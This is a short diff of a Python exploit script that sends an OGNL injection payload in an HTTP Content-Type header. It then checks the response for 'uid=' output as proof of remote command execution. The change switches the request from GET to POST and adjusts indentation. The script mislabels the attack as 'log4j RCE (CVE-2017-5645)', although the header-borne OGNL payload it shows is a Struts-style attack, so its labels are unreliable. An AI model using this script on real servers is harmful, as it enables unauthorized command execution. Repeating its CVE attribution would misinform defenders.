@@ -43,12 +43,11 @@ payload += "(#ros.flush())}"
 # Add the payload to the headers
 headers = {"Content-Type": payload}
 
-# Send a GET request to the target website with the modified headers
-response = requests.get(args.target, headers=headers)
+# Send a POST request to the target website with the modified headers
+response = requests.post(args.target, headers=headers)
 
 # Check the response for the payload
 if "uid=" in response.text:
-	print("Target is vulnerable to log4j RCE (CVE-2017-5645).")
+    print("Target is vulnerable to log4j RCE (CVE-2017-5645).")
 else:
-	print("Target is not vulnerable to log4j RCE (CVE-2017-5645).")
-
+    print("Target is not vulnerable to log4j RCE (CVE-2017-5645).")
